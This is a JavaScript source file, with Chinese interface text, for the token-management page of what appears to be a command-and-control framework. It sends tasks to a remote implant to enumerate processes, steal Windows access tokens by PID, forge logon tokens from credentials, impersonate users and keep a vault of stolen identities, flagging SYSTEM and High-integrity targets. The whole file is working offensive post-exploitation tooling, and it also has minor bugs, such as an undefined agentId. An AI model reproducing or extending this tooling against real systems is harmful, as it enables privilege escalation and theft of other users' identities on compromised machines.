// Token management page - enumerate, steal, make, revert, impersonate, vault

function tokenListProcs(id) {
  setOutput('正在枚举进程令牌，等待 Implant...');
  document.getElementById('proc-list-status').classList.remove('hidden');
  fetch(`/agents/${id}/token/list_procs`, { method: 'POST' })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        showToast('枚举请求已发送，等待 Implant 响应');
        startPollingTaskResult(id, d.task_id);
      } else {
        setOutput('请求失败: ' + (d.error || '未知错误'));
      }
    });
}

function tokenSteal(id) {
  const pid = document.getElementById('steal-pid').value.trim();
  const procName = document.getElementById('steal-procname').value.trim();
  if (!pid) { showToast('请输入目标 PID', 'error'); return; }

  setOutput(`正在向 Implant 发送 steal_token pid=${pid}...`);
  fetch(`/agents/${id}/token/steal`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `pid=${encodeURIComponent(pid)}&process_name=${encodeURIComponent(procName)}`
  })
  .then(r => r.json())
  .then(d => {
    if (d.success) {
      showToast('Steal Token 已发送，等待结果');
      startPollingTaskResult(id, d.task_id);
    } else {
      setOutput('请求失败: ' + (d.error || ''));
    }
  });
}

function tokenMake(id) {
  const user = document.getElementById('make-user').value.trim();
  const password = document.getElementById('make-password').value;
  const logonType = document.getElementById('make-logon-type').value;
  if (!user) { showToast('请输入用户名', 'error'); return; }

  setOutput(`正在创建令牌 ${user} (${logonType})...`);
  fetch(`/agents/${id}/token/make`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `user=${encodeURIComponent(user)}&password=${encodeURIComponent(password)}&logon_type=${encodeURIComponent(logonType)}`
  })
  .then(r => r.json())
  .then(d => {
    if (d.success) {
      showToast('Make Token 已发送');
      startPollingTaskResult(id, d.task_id);
    } else {
      setOutput('请求失败: ' + (d.error || ''));
    }
  });
}

function tokenRevert(id) {
  setOutput('正在发送 RevertToSelf...');
  fetch(`/agents/${id}/token/revert`, { method: 'POST' })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        showToast('Rev2Self 已发送');
        startPollingTaskResult(id, d.task_id);
      } else {
        setOutput('请求失败: ' + (d.error || ''));
      }
    });
}

function tokenWhoami(id) {
  setOutput('正在查询当前令牌身份...');
  fetch(`/agents/${id}/token/whoami`, { method: 'POST' })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        showToast('Whoami 已发送');
        startPollingTaskResult(id, d.task_id);
      } else {
        setOutput('请求失败: ' + (d.error || ''));
      }
    });
}

function tokenReImpersonate(id, tokenId) {
  if (!confirm('重新模拟此令牌？')) return;
  fetch(`/agents/${id}/token/${tokenId}/impersonate`, { method: 'POST' })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        showToast('重新模拟任务已发送');
        startPollingTaskResult(id, d.task_id);
      } else {
        setOutput('请求失败: ' + (d.error || ''));
      }
    });
}

function dropToken(id, tokenId, btn) {
  if (!confirm('确定删除此令牌记录？')) return;
  fetch(`/agents/${id}/token/${tokenId}`, { method: 'DELETE' })
    .then(r => r.json())
    .then(d => {
      if (d.success) {
        btn.closest('.token-entry').remove();
        showToast('令牌已删除');
      } else {
        showToast('删除失败: ' + (d.error || ''), 'error');
      }
    });
}

function editTokenNote(id, tokenId, currentNote) {
  const note = prompt('编辑备注:', currentNote || '');
  if (note === null) return;
  fetch(`/agents/${id}/token/${tokenId}/note`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: `notes=${encodeURIComponent(note)}`
  }).then(() => { showToast('备注已更新'); location.reload(); });
}

function refreshTokenVault(id) {
  fetch(`/agents/${id}/token/list`)
    .then(r => r.json())
    .then(tokens => {
      renderTokenVault(id, tokens);
    });
}

function renderTokenVault(id, tokens) {
  const vault = document.getElementById('token-vault');
  if (!vault) return;
  if (!tokens || tokens.length === 0) {
    vault.innerHTML = `<div class="text-center py-10 text-slate-400 text-sm border-2 border-dashed border-slate-200 rounded-2xl">
      <i class="fa-solid fa-vault text-3xl mb-3 text-slate-300"></i><br>暂无令牌
    </div>`;
    return;
  }
  const integrityClass = (i) => {
    if (i === 'System') return 'bg-red-100 text-red-700';
    if (i === 'High') return 'bg-orange-100 text-orange-700';
    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
    return 'bg-slate-100 text-slate-600';
  };
  vault.innerHTML = tokens.map(t => `
    <div class="token-entry flex items-center gap-3 p-3 rounded-2xl border ${t.active ? 'border-amber-300 bg-amber-50' : 'border-slate-100 bg-slate-50'} transition-colors" data-token-id="${t.id}">
      <div class="w-9 h-9 rounded-xl flex items-center justify-center flex-shrink-0 ${t.source === 'steal' ? 'bg-amber-500' : 'bg-emerald-500'}">
        <i class="fa-solid ${t.source === 'steal' ? 'fa-hand-holding' : 'fa-magic'} text-white text-sm"></i>
      </div>
      <div class="flex-1 min-w-0">
        <div class="flex items-center gap-2">
          <span class="font-semibold text-sm text-slate-900 truncate">${escHtml(t.domain)}\\${escHtml(t.username)}</span>
          ${t.active ? '<span class="text-[10px] px-1.5 py-0.5 bg-amber-200 text-amber-800 rounded font-medium">活跃</span>' : ''}
        </div>
        <div class="flex items-center gap-3 text-xs text-slate-400 mt-0.5">
          ${t.pid ? `<span><i class="fa-solid fa-microchip mr-1"></i>PID: ${t.pid}</span>` : ''}
          ${t.process_name ? `<span class="font-mono">${escHtml(t.process_name)}</span>` : ''}
          <span class="px-1.5 py-px rounded text-[10px] font-medium ${integrityClass(t.integrity)}">${t.integrity || '-'}</span>
          <span class="text-[10px] text-slate-300">${t.source}</span>
        </div>
        ${t.notes ? `<div class="text-xs text-slate-400 italic mt-0.5 truncate">${escHtml(t.notes)}</div>` : ''}
      </div>
      <div class="flex items-center gap-1 flex-shrink-0">
        ${!t.active ? `<button onclick="tokenReImpersonate('${id}', ${t.id})" title="重新模拟" class="p-1.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded-lg transition-colors"><i class="fa-solid fa-play text-xs"></i></button>` : ''}
        <button onclick="editTokenNote('${id}', ${t.id}, '${(t.notes||'').replace(/'/g,"\\'")}' )" class="p-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 rounded-lg transition-colors"><i class="fa-solid fa-pencil text-xs"></i></button>
        <button onclick="dropToken('${id}', ${t.id}, this)" class="p-1.5 bg-red-50 hover:bg-red-100 text-red-600 rounded-lg transition-colors"><i class="fa-solid fa-trash text-xs"></i></button>
      </div>
    </div>
  `).join('');
}

function renderProcTable(procs) {
  const tbody = document.getElementById('proc-tbody');
  if (!procs || procs.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" class="text-center py-6 text-slate-400">无数据</td></tr>';
    return;
  }

  const intClass = (i) => {
    if (i === 'System') return 'bg-red-100 text-red-700';
    if (i === 'High') return 'bg-orange-100 text-orange-700';
    if (i === 'Medium') return 'bg-yellow-100 text-yellow-700';
    return 'bg-slate-100 text-slate-600';
  };

  tbody.innerHTML = procs.map(p => {
    const user = p.Error ? `<span class="text-slate-300 italic">${p.Error}</span>` : `<span class="text-slate-700">${escHtml(p.Domain)}\\${escHtml(p.Username)}</span>`;
    const stealBtn = !p.Error ? `<button onclick="fillSteal(${p.PID}, '${(p.ProcessName||'').replace(/'/g,"\\'")}' )"
      class="px-2 py-0.5 bg-amber-100 hover:bg-amber-200 text-amber-700 rounded text-[10px] font-medium whitespace-nowrap">Steal</button>` : '';
    return `<tr class="hover:bg-slate-50 proc-row" data-name="${(p.ProcessName||'').toLowerCase()}" data-user="${((p.Domain||'')+'\\\\' +(p.Username||'')).toLowerCase()}">
      <td class="py-1.5 px-2 font-mono text-indigo-600">${p.PID}</td>
      <td class="py-1.5 px-2 font-mono text-xs truncate max-w-[8rem]">${escHtml(p.ProcessName)}</td>
      <td class="py-1.5 px-2">${user}</td>
      <td class="py-1.5 px-2"><span class="px-1.5 py-px rounded text-[10px] font-medium ${intClass(p.Integrity)}">${p.Integrity || '-'}</span></td>
      <td class="py-1.5 px-2">${stealBtn}</td>
    </tr>`;
  }).join('');
}

function fillSteal(pid, procName) {
  document.getElementById('steal-pid').value = pid;
  document.getElementById('steal-procname').value = procName;
  document.getElementById('steal-pid').scrollIntoView({behavior:'smooth', block:'center'});
}

function quickFillProcName(name) {
  document.getElementById('steal-procname').value = name;
}

function filterProcTable(query) {
  const q = query.toLowerCase();
  document.querySelectorAll('#proc-tbody .proc-row').forEach(row => {
    const match = !q || row.dataset.name.includes(q) || row.dataset.user.includes(q);
    row.style.display = match ? '' : 'none';
  });
}

function startPollingTaskResult(agentId, taskId) {
  let tries = 0;
  const maxTries = 40;
  const interval = setInterval(() => {
    tries++;
    fetch(`/tasks/${taskId}`)
      .then(r => r.json())
      .then(data => {
        if (data.status === 'completed') {
          clearInterval(interval);
          handleTaskCompleted(agentId, data);
        } else if (data.status === 'failed') {
          clearInterval(interval);
          setOutput(`[失败] ${data.error || '未知错误'}`);
          showToast('任务失败: ' + (data.error || ''), 'error');
        } else if (tries >= maxTries) {
          clearInterval(interval);
          setOutput('[超时] Implant 未在60秒内响应，请检查连接');
        }
      });
  }, 1500);
}

function handleTaskCompleted(agentId, data) {
  const type = data.type;

  if (type === 'token_list_procs') {
    try {
      let raw = data.result;
      let procs;
      try {
        procs = JSON.parse(atob(raw));
      } catch(e) {
        procs = JSON.parse(raw);
      }
      renderProcTable(procs);
      setOutput(`枚举完成，共 ${procs.length} 个进程`);
      document.getElementById('proc-list-status').classList.add('hidden');
    } catch(e) {
      setOutput('进程列表: ' + data.result);
    }
  } else if (type === 'token_steal' || type === 'token_make') {
    try {
      const m = JSON.parse(data.result);
      setOutput(
        `✓ 令牌${type === 'token_steal' ? '窃取' : '创建'}成功\n` +
        `  用户:  ${m.domain}\\${m.username}\n` +
        `  完整性: ${m.integrity}\n` +
        `  当前身份: ${m.whoami}`
      );
      showToast(`令牌${type === 'token_steal' ? '窃取' : '创建'}成功: ${m.domain}\\${m.username}`);
      setTimeout(() => refreshTokenVault(agentId), 800);
      updateImpersonationBadge(m.domain, m.username, m.integrity);
    } catch(e) {
      setOutput(data.result);
    }
  } else if (type === 'token_revert' || type === 'rev2self') {
    try {
      const m = JSON.parse(data.result);
      setOutput(`✓ RevertToSelf 成功\n  恢复身份: ${m.whoami}`);
      showToast('已还原至原始令牌');
      clearImpersonationBadge();
      setTimeout(() => refreshTokenVault(agentId), 800);
    } catch(e) {
      setOutput(data.result);
    }
  } else if (type === 'token_whoami') {
    try {
      const m = JSON.parse(data.result);
      setOutput(`当前身份: ${m.whoami}`);
    } catch(e) {
      setOutput(data.result);
    }
  } else {
    setOutput(data.result || data.error || '(空)');
  }
}

function updateImpersonationBadge(domain, username, integrity) {
  const badge = document.getElementById('impersonation-badge');
  badge.innerHTML = `
    <div class="flex items-center gap-2 bg-amber-100 border border-amber-300 rounded-2xl px-4 py-2">
      <span class="w-2.5 h-2.5 bg-amber-500 rounded-full animate-pulse"></span>
      <span class="text-sm font-semibold text-amber-700">
        <i class="fa-solid fa-user-secret mr-1"></i>
        正在模拟: ${escHtml(domain)}\\${escHtml(username)}
      </span>
      <span class="text-xs text-amber-600 ml-1">(${integrity})</span>
      <button onclick="tokenRevert('${agentId}')"
              class="ml-2 px-2.5 py-1 bg-amber-500 hover:bg-amber-600 text-white text-xs rounded-xl transition-colors">
        <i class="fa-solid fa-sign-out-alt mr-1"></i>Rev2Self
      </button>
    </div>`;
}

function clearImpersonationBadge() {
  const badge = document.getElementById('impersonation-badge');
  badge.innerHTML = `
    <div class="flex items-center gap-2 bg-slate-100 border border-slate-200 rounded-2xl px-4 py-2">
      <span class="w-2.5 h-2.5 bg-slate-400 rounded-full"></span>
      <span class="text-sm text-slate-500">未模拟（原始令牌）</span>
    </div>`;
}

function setOutput(text) {
  const el = document.getElementById('token-output');
  el.textContent = text;
}

function escHtml(s) {
  if (!s) return '';
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
